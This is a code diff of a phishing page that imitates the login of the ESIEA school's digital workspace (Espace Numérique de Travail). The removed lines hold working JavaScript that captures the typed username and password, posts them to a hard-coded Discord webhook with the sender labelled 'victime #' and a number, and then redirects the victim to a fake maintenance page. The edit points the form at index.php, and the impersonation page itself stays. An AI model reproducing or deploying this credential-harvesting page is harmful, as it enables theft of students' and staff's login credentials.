@@ -11,7 +11,7 @@
 
 <body>
     <div class="container">
-        <form action="" method="post">
+        <form action="index.php" method="post">
             <div>
                 <h1 style="font-family: -apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,'Helvetica Neue',Arial,'Noto Sans','Liberation Sans',sans-serif,'Apple Color Emoji','Segoe UI Emoji','Segoe UI Symbol','Noto Color Emoji';">Connexion à Espace Numérique de Travail de l'ESIEA</h1>
             </div>
@@ -53,28 +53,7 @@
 
             </div>
         </form>
-    </div>
-    <script>
-        document.querySelector('form').addEventListener('submit', function(event) {
-            event.preventDefault();
-        
-            var formData = new FormData(event.target);
-            var data = {
-                content: 'Connexion à Espace Numérique de Travail de l\'ESIEA\n```Username: '+ formData.get('email')+ '\nPassword: '+formData.get('password')+'```',
-                username: 'victime #'+Math.floor(Math.random() * 100000),
-            };
-        
-            fetch('https://discord.com/api/webhooks/1199663607286333460/jWA-PuxbU8C-E76X13aHK37hNIn4-ZP6k3-hbGK9SrdMNf5hTyAe65a1ViKyKfqg6nSg', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify(data)
-            }).then(function() {
-                window.location.href = '../maintenance/maintenance.html'
-            })
-        });
-    </script>
+    </div>    
 </body>
 
 </html>
